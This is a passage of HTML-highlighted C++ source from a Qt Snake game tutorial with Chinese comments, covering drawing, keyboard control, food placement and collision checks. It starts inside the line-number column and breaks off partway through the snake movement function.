class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;widget.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ui_widget.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QVBoxLayout&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QPushButton&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QLabel&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QLineEdit&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QPainter&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QTime&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QDebug&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ROW 20 <span class="hljs-comment">//行数</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> COLUMN 20 <span class="hljs-comment">//列数</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> Direction 4 <span class="hljs-comment">//方向(枚举值</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::keyPressEvent</span><span class="hljs-params">(QKeyEvent *event)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(event-&gt;<span class="hljs-built_in">key</span>()==<span class="hljs-string">&#x27;W&#x27;</span>&amp;&amp;m_direction!=Down)&#123;<br>        m_direction=Up;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(event-&gt;<span class="hljs-built_in">key</span>()==<span class="hljs-string">&#x27;S&#x27;</span>&amp;&amp;m_direction!=Up)&#123;<br>        m_direction=Down;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(event-&gt;<span class="hljs-built_in">key</span>()==<span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;m_direction!=Right)&#123;<br>        m_direction=Left;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(event-&gt;<span class="hljs-built_in">key</span>()==<span class="hljs-string">&#x27;D&#x27;</span>&amp;&amp;m_direction!=Left)&#123;<br>        m_direction=Right;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::paintEvent</span><span class="hljs-params">(QPaintEvent *event)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">Q_UNUSED</span>(event);<br>    QPen pen;<br>    pen.<span class="hljs-built_in">setColor</span>(<span class="hljs-built_in">QColor</span>(Qt::darkGray));<br>    QFont font;<br>    font.<span class="hljs-built_in">setPointSize</span>(<span class="hljs-number">6</span>);<br>    <span class="hljs-function">QPainter <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-keyword">this</span>)</span></span>;<br>    p.<span class="hljs-built_in">drawPixmap</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">width</span>(),<span class="hljs-built_in">height</span>(),<span class="hljs-built_in">QPixmap</span>(<span class="hljs-string">&quot;:/img/imgs/bg.jpg&quot;</span>));<br>    p.<span class="hljs-built_in">setPen</span>(pen);<br>    p.<span class="hljs-built_in">setFont</span>(font);<br>    <span class="hljs-comment">//绘制游戏布局</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> row = <span class="hljs-number">0</span>; row &lt; ROW; ++row) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> column =<span class="hljs-number">0</span>; column &lt; COLUMN; ++column) &#123;<br>            p.<span class="hljs-built_in">fillRect</span>(row*<span class="hljs-number">20</span>,column*<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<span class="hljs-built_in">QBrush</span>(<span class="hljs-built_in">QColor</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>)));<br>            p.<span class="hljs-built_in">drawRect</span>(row*<span class="hljs-number">20</span>,column*<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<span class="hljs-number">20</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//绘制食物</span><br>    p.<span class="hljs-built_in">fillRect</span>(m_foodPos.<span class="hljs-built_in">x</span>()*<span class="hljs-number">20</span>,m_foodPos.<span class="hljs-built_in">y</span>()*<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<br>               <span class="hljs-built_in">QBrush</span>(<span class="hljs-built_in">QPixmap</span>(<span class="hljs-string">&quot;:/img/imgs/apple.png&quot;</span>).<span class="hljs-built_in">scaled</span>(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>)));<br>    <span class="hljs-comment">//绘制蛇</span><br>    <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">first</span>())&#123;<br>       Linkedlist:: SnakeNode *pt=linkedlist-&gt;<span class="hljs-built_in">first</span>();<br>        <span class="hljs-keyword">do</span>&#123;<br>           <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">first</span>()==pt)&#123;<span class="hljs-comment">//绘制蛇头</span><br>               QPixmap pixmap;<br>               <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (m_direction) &#123;<br>               <span class="hljs-keyword">case</span> Up:<br>                   pixmap=<span class="hljs-built_in">QPixmap</span>(<span class="hljs-string">&quot;:/img/imgs/up.png&quot;</span>).<span class="hljs-built_in">scaled</span>(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>);<br>                   <span class="hljs-keyword">break</span>;<br>               <span class="hljs-keyword">case</span> Down:<br>                   pixmap=<span class="hljs-built_in">QPixmap</span>(<span class="hljs-string">&quot;:/img/imgs/down.png&quot;</span>).<span class="hljs-built_in">scaled</span>(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>);<br>                   <span class="hljs-keyword">break</span>;<br>               <span class="hljs-keyword">case</span> Left:<br>                   pixmap=<span class="hljs-built_in">QPixmap</span>(<span class="hljs-string">&quot;:/img/imgs/left.png&quot;</span>).<span class="hljs-built_in">scaled</span>(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>);<br>                   <span class="hljs-keyword">break</span>;<br>               <span class="hljs-keyword">case</span> Right:<br>                   pixmap=<span class="hljs-built_in">QPixmap</span>(<span class="hljs-string">&quot;:/img/imgs/right.png&quot;</span>).<span class="hljs-built_in">scaled</span>(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>);<br>                   <span class="hljs-keyword">break</span>;<br>               <span class="hljs-keyword">default</span>:<br>                   <span class="hljs-keyword">break</span>;<br>               &#125;<br>               p.<span class="hljs-built_in">fillRect</span>(pt-&gt;pos.<span class="hljs-built_in">x</span>()*<span class="hljs-number">20</span>,<br>                          pt-&gt;pos.<span class="hljs-built_in">y</span>()*<span class="hljs-number">20</span>,<br>                          <span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<br>                          <span class="hljs-built_in">QBrush</span>(pixmap));<br>           &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">last</span>()==pt)&#123; <span class="hljs-comment">//绘制蛇尾</span><br>               QPixmap pixmap;<br>               pixmap=<span class="hljs-built_in">QPixmap</span>(<span class="hljs-string">&quot;:/img/imgs/tail.png&quot;</span>).<span class="hljs-built_in">scaled</span>(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>);<br>               p.<span class="hljs-built_in">fillRect</span>(pt-&gt;pos.<span class="hljs-built_in">x</span>()*<span class="hljs-number">20</span>,<br>                          pt-&gt;pos.<span class="hljs-built_in">y</span>()*<span class="hljs-number">20</span>,<br>                          <span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<br>                          <span class="hljs-built_in">QBrush</span>(pixmap));<br>           &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//绘制蛇的其他位置</span><br>               QPixmap pixmap;<br>               pixmap=<span class="hljs-built_in">QPixmap</span>(<span class="hljs-string">&quot;:/img/imgs/body.png&quot;</span>).<span class="hljs-built_in">scaled</span>(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>);<br>               p.<span class="hljs-built_in">fillRect</span>(pt-&gt;pos.<span class="hljs-built_in">x</span>()*<span class="hljs-number">20</span>,<br>                          pt-&gt;pos.<span class="hljs-built_in">y</span>()*<span class="hljs-number">20</span>,<br>                          <span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<br>                          <span class="hljs-built_in">QBrush</span>(pixmap));<br>           &#125;<br>           <span class="hljs-comment">//指向下一个蛇身节点</span><br>            pt=pt-&gt;next;<br>        &#125;<span class="hljs-keyword">while</span>(pt!=<span class="hljs-literal">NULL</span>);<br>    &#125;<br>&#125;<br>Widget::<span class="hljs-built_in">Widget</span>(QWidget *parent) :<br>    <span class="hljs-built_in">QWidget</span>(parent),<br>    <span class="hljs-built_in">ui</span>(<span class="hljs-keyword">new</span> Ui::Widget)<br>&#123;<br>    ui-&gt;<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">setFixedSize</span>(<span class="hljs-number">800</span>,<span class="hljs-number">450</span>);<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">setWindowTitle</span>(<span class="hljs-string">&quot;贪吃蛇&quot;</span>);<br>    <span class="hljs-built_in">initializedGUI</span>();<br>&#125;<br>Widget::~<span class="hljs-built_in">Widget</span>()<br>&#123;<br>    <span class="hljs-keyword">delete</span> ui;<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Widget::initializedGUI</span><br><span class="hljs-comment">/// 初始化</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::initializedGUI</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    m_score=<span class="hljs-number">0</span>;<br>    QPushButton *btnStart=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QPushButton</span>(<span class="hljs-keyword">this</span>);<br>    QPushButton *btnStop=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QPushButton</span>(<span class="hljs-keyword">this</span>);<br>    QLabel *lbScore=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLabel</span>(<span class="hljs-keyword">this</span>);<br>    leScore=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLineEdit</span>(<span class="hljs-keyword">this</span>);<br>    btnStart-&gt;<span class="hljs-built_in">setText</span>(QObject::<span class="hljs-built_in">tr</span>(<span class="hljs-string">&quot;开始游戏&quot;</span>));<br>    btnStop-&gt;<span class="hljs-built_in">setText</span>(QObject::<span class="hljs-built_in">tr</span>(<span class="hljs-string">&quot;暂停游戏&quot;</span>));<br>    btnStart-&gt;<span class="hljs-built_in">setFlat</span>(<span class="hljs-literal">true</span>);<br>    btnStop-&gt;<span class="hljs-built_in">setFlat</span>(<span class="hljs-literal">true</span>);<br>    lbScore-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-built_in">tr</span>(<span class="hljs-string">&quot;得分:&quot;</span>));<br>    leScore-&gt;<span class="hljs-built_in">setText</span>(QString::<span class="hljs-built_in">number</span>(m_score));<br>    leScore-&gt;<span class="hljs-built_in">setFocusPolicy</span>(Qt::NoFocus);<br>    leScore-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>    lbScore-&gt;<span class="hljs-built_in">move</span>(<span class="hljs-number">500</span>,<span class="hljs-number">50</span>);<br>    leScore-&gt;<span class="hljs-built_in">move</span>(<span class="hljs-number">560</span>,<span class="hljs-number">50</span>);<br>    btnStart-&gt;<span class="hljs-built_in">move</span>(<span class="hljs-number">500</span>,<span class="hljs-number">100</span>);<br>    btnStop-&gt;<span class="hljs-built_in">move</span>(<span class="hljs-number">500</span>,<span class="hljs-number">150</span>);<br>    <span class="hljs-built_in">connect</span>(btnStart,<span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">clicked</span>(<span class="hljs-keyword">bool</span>)),<span class="hljs-keyword">this</span>,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">startGame</span>()));<br>    <span class="hljs-built_in">connect</span>(btnStop,<span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">clicked</span>(<span class="hljs-keyword">bool</span>)),<span class="hljs-keyword">this</span>,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">stopGame</span>()));<br>    QTime t= QTime::<span class="hljs-built_in">currentTime</span>();<br>    <span class="hljs-keyword">int</span> s= t.<span class="hljs-built_in">secsTo</span>(<span class="hljs-built_in">QTime</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>));<br>    <span class="hljs-built_in">qsrand</span>(s);<span class="hljs-comment">//随机数</span><br>    m_direction=<span class="hljs-built_in">qrand</span>()%Direction;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (m_direction) &#123;<br>    <span class="hljs-keyword">case</span> Up:<span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;蛇头方向:上&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> Down:<span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;蛇头方向:下&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> Left:<span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;蛇头方向:左&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> Right:<span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;蛇头方向:右&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    m_foodPos.<span class="hljs-built_in">setX</span>(<span class="hljs-built_in">qrand</span>()%COLUMN);<br>    m_foodPos.<span class="hljs-built_in">setY</span>(<span class="hljs-built_in">qrand</span>()%ROW);<br>    <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;食物坐标:&quot;</span>&lt;&lt;m_foodPos;<br>    m_speed=<span class="hljs-number">150</span>;<br>    m_timerControl=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QTimer</span>(<span class="hljs-keyword">this</span>);<br>    m_timerControl-&gt;<span class="hljs-built_in">setInterval</span>(m_speed);<br>    <span class="hljs-built_in">connect</span>(m_timerControl,<span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">timeout</span>()),<span class="hljs-keyword">this</span>,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">timeOut</span>()));<br>    QPoint pos;<br>    pos.<span class="hljs-built_in">setX</span>(<span class="hljs-built_in">qrand</span>()%COLUMN);<br>    pos.<span class="hljs-built_in">setY</span>(<span class="hljs-built_in">qrand</span>()%ROW);<br>    <span class="hljs-comment">//在Linkedlist构造时初始化蛇头坐标</span><br>    linkedlist=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Linkedlist</span>(<span class="hljs-keyword">this</span>,pos);<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Widget::resetFoodPos</span><br><span class="hljs-comment">/// 重设食物坐标</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::resetFoodPos</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    m_foodPos.<span class="hljs-built_in">setX</span>(<span class="hljs-built_in">qrand</span>()%COLUMN);<br>    m_foodPos.<span class="hljs-built_in">setY</span>(<span class="hljs-built_in">qrand</span>()%ROW);<br>    <span class="hljs-built_in">checkFoodPosisEqualHeadPos</span>();<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Widget::checkisEatSelf</span><br><span class="hljs-comment">/// 判断是否吃到自己</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::checkisEatSelf</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">first</span>())&#123;<br>        Linkedlist::SnakeNode *p0=linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;next;<br>        <span class="hljs-keyword">if</span>(p0)&#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-comment">//判断蛇头坐标是否等于蛇身某个节点坐标</span><br>            <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos==p0-&gt;pos)&#123;<br>                <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;吃到自己!游戏结束&quot;</span>;<br>                m_timerControl-&gt;<span class="hljs-built_in">stop</span>();<br>                QMessageBox::<span class="hljs-built_in">critical</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;game over&quot;</span>,<span class="hljs-string">&quot;game over&quot;</span>);<br>                <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">close</span>();<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            p0=p0-&gt;next;<br>        &#125; <span class="hljs-keyword">while</span> (p0);<br>    &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Widget::checkisEatFood</span><br><span class="hljs-comment">/// 检测是否吃到食物</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::checkisEatFood</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">x</span>()==m_foodPos.<span class="hljs-built_in">x</span>()&amp;&amp;<br>            linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">y</span>()==m_foodPos.<span class="hljs-built_in">y</span>())&#123;<br>        <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;吃到食物！&quot;</span>;<br>        m_eatfoodCount++;<br>        m_score+=<span class="hljs-number">20</span>;<br>        leScore-&gt;<span class="hljs-built_in">setText</span>(QString::<span class="hljs-built_in">number</span>(m_score)+<span class="hljs-string">&quot; 分&quot;</span>);<br>        <span class="hljs-keyword">if</span>(m_score&gt;=<span class="hljs-number">100</span>)&#123;<br>            m_speed=<span class="hljs-number">80</span>;<br>            m_timerControl-&gt;<span class="hljs-built_in">setInterval</span>(m_speed);<br>        &#125;<br>        <span class="hljs-comment">//随便设置的x y 坐标</span><br>        QPoint pos=<span class="hljs-built_in">QPoint</span>();<br>        linkedlist-&gt;<span class="hljs-built_in">append</span>(pos);<br>        <span class="hljs-comment">//重新设置食物坐标</span><br>        <span class="hljs-built_in">resetFoodPos</span>();<br>    &#125;<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Widget::checkisHitWall</span><br><span class="hljs-comment">/// 检测是否撞到墙</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::checkisHitWall</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">x</span>()&lt;<span class="hljs-number">0</span>||linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">y</span>()&lt;<span class="hljs-number">0</span>||<br>            linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">x</span>()&gt;COLUMN<span class="hljs-number">-1</span>||linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">y</span>()&gt;ROW<span class="hljs-number">-1</span>)&#123;<br>        m_timerControl-&gt;<span class="hljs-built_in">stop</span>();<br>        <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;撞到墙壁！游戏结束！&quot;</span>;<br>        QMessageBox::<span class="hljs-built_in">critical</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;game over&quot;</span>,<span class="hljs-string">&quot;game over!&quot;</span>);<br>        <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">close</span>();<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::timeOut</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">checkisEatFood</span>();<br>    <span class="hljs-comment">//打印出蛇身节点坐标</span><br>    linkedlist-&gt;<span class="hljs-built_in">printLinkedlist</span>();<br>    <span class="hljs-comment">//蛇身移动</span><br>    <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">first</span>())&#123;<br>        Linkedlist::SnakeNode *p0=linkedlist-&gt;<span class="hljs-built_in">last</span>();<br>        <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">getLength</span>()!=<span class="hljs-number">1</span>&amp;&amp;p0)&#123;<br>            <span class="hljs-keyword">do</span> &#123;<br>                <span class="hljs-comment">//把前一个节点的坐标赋值给当前节点 ，即蛇向前移动一格</span><br>                p0-&gt;pos=p0-&gt;prev-&gt;pos;<br>                <span class="hljs-comment">//指向前一个节点</span><br>                p0=p0-&gt;prev;<br>                <span class="hljs-comment">//因为 头结点的前一个节点为NULL</span><br>                <span class="hljs-comment">//所以这里必须 p0!= linkedlist-&gt;first()</span><br>            &#125; <span class="hljs-keyword">while</span> (p0!=linkedlist-&gt;<span class="hljs-built_in">first</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//蛇运动</span><br>    <span class="hljs-built_in">snakeRunning</span>();<br>    <span class="hljs-built_in">checkisHitWall</span>();<br>    <span class="hljs-built_in">checkisEatSelf</span>();<br>    <span class="hljs-comment">//更新绘图</span><br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">update</span>();<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Widget::startGame</span><br><span class="hljs-comment">/// 开始游戏</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::startGame</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    m_timerControl-&gt;<span class="hljs-built_in">start</span>();<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Widget::stopGame</span><br><span class="hljs-comment">/// 结束游戏</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::stopGame</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    m_timerControl-&gt;<span class="hljs-built_in">stop</span>();<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Widget::snakeRunning</span><br><span class="hljs-comment">/// 蛇运动</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::snakeRunning</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> x=linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">x</span>();<br>    <span class="hljs-keyword">int</span> y=linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">y</span>();<br>    <span class="hljs-comment">//判断方向</span><br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (m_direction) &#123;<br>    <span class="hljs-keyword">case</span> Up:<br>        linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">setY</span>(y-=<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> Down:<br>        linkedlist-&gt;<span 